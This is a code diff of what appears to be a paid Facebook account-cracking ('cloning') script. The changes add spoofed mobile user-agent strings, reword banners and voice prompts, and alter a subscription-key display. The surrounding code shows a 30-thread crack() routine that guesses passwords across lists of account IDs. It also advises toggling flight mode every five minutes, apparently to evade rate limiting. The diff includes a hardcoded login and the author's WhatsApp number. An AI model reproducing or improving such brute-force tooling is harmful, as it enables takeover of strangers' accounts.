@@ -32,6 +32,23 @@ ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
+ua = ["Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
+ua = ["Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
+ua = ["Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",]
+ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TPB3.220513.017.B1)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; Redmi 7A Build/SP2A.220305.013.A3)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; RMX3350 Build/SP1A.210812.016)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 13; SM-S908B Build/TP1A.220513.002)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-T227U Build/SP1A.210812.016)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-F936W Build/SP2A.220305.013)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; TECNO CI8 Build/SP1A.210812.016)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 9 Pro Max Build/TP1A.220905.004)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SD32.56-53)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-A215U Build/SP1A.210812.016)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-F900F Build/SP2A.220305.013)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 10; Realme XT Build/QD4A.200905.003)",]
+ua = ["Dalvik/2.1.0 (Linux; U; Android 12; RMX3360 Build/RKQ1.210503.001)",]
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -162,7 +179,7 @@ while attemps < 12345677901:
 
     if username == 'FIROZ' and password == 'mubin':
         print(' \033[0;92mLog in successfully brother.')
-        os.system('espeak -a 300 " You, have, logged, in, successfully,  brother,"')
+        os.system('espeak -a 300 " You have logged in successfully  brother,"')
         break
     else:
         print(' Incorrect Pass Please Check And Try Again ')
@@ -188,15 +205,15 @@ def banner():
  \033[1;93m╚═════╝ \033[1;97m╚═════╝ \033[1;92m╚═════╝ \033[1;94m╚═╝  ╚═╝\033[1;91m╚═╝  ╚═╝
 \033[0;36m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[1;97m
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[1;95m        [ WORKS ON ONLY MOBILE DATA ]        \033[1;97m║
+║\33[1;95m      [ WORKS ON WIFI AND MOBILE DATA ]      \033[1;97m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[0;35m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[Author                   : \33[1;38mFIROZ AHMED \33[1;38m   ║\033[1;31m 
-╠══[Facebook                 : Firoz Ahmed    ║  \033[1;97m  
-╠══[Github                   : \33[1;38mFiroz-Boss     ║\33[1;34m   
-╠══[Whatsapp                 : 01871528249    ║\33[1;35m 
-╠══[TOOLS                    : Paid           ║ \33[1;32m   
-╠══[VERSION                  : 0.1            ║\033[1;35m 
+╠══[Author                   : \33[1;38mFIROZ AHMED \33[1;38m   ║\033[1;33m 
+╠══[Facebook                 : Firoz Ahmed    ║  \033[1;92m  
+╠══[Github                   : \33[1;38mFiroz-Boss     ║\33[1;32m   
+╠══[Whatsapp                 : 01871528249    ║\33[1;33m 
+╠══[TOOLS                    : Paid           ║ \33[1;31m   
+╠══[VERSION                  : 0.1            ║\033[1;36m 
 \033[0;35m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 def login():
 	banner()
@@ -222,6 +239,7 @@ def login():
 		exit()
 	else:
 		print('# SELECT CORRECTLY ')
+		os.system('espeak -a 300 " Please select correctly brother"')
 		back()
 def error():
 	print(f'{k}#TRY AGAIN {u}')
@@ -430,7 +448,7 @@ def passwrd():
 	banner()
 	print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;93m USER NAME\033[1;96m :\033[1;97m "+NameX)
 	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mTOTAL ID′S\033[1;96m :\033[0;97m '+str(len(id)))
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;33mCloning Speed Super Fast")
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;33mCloning Speed Ultra Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;35mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
 	COBRAj(f'\033[0;97m===============================================')
 	with tred(max_workers=30) as pool:
@@ -485,7 +503,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}\033[1m[FIROZ-AHMED] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[FIROZ-AHMED] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -546,7 +564,7 @@ def Subscraption():
 		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m COBRA-BOSS, TOOLS Daily Update")
 		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
 		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+FIROZ+key1)
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+imt+ak+FIROZ+key1)
 		name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Name : ")
 		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
 		time.sleep(3.5)
